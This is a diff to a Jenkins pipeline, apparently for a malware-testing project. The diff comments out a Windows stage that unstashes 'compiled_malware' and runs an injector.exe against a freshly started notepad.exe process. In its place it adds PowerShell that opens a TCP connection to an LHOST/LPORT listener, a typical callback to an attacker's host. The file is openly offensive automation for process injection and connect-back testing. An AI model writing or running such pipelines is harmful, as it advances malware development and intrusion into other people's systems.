@@ -67,15 +67,20 @@ pipeline {
                             agent { label 'windows' }
                             steps {
                                 dir('testing') {
-                                    unstash 'compiled_malware'
                                     powershell '''
-                                        Start-Sleep -Seconds 15
-                                        $proc = Start-Process -FilePath 'notepad.exe' -PassThru
-                                        Start-Sleep -Seconds 2
-                                        $targetPid = $proc.Id
-                                        Write-Host "Target PID: $targetPid"
-                                        Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
+                                        Start-Sleep -Seconds 10
+                                        $client = New-Object System.Net.Sockets.TcpClient
+                                        $client.Connect($env:LHOST, [int]$env:LPORT)
                                     '''
+                                // unstash 'compiled_malware'
+                                // powershell '''
+                                //     Start-Sleep -Seconds 15
+                                //     $proc = Start-Process -FilePath 'notepad.exe' -PassThru
+                                //     Start-Sleep -Seconds 2
+                                //     $targetPid = $proc.Id
+                                //     Write-Host "Target PID: $targetPid"
+                                //     Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
+                                // '''
                                 }
                             }
                         }
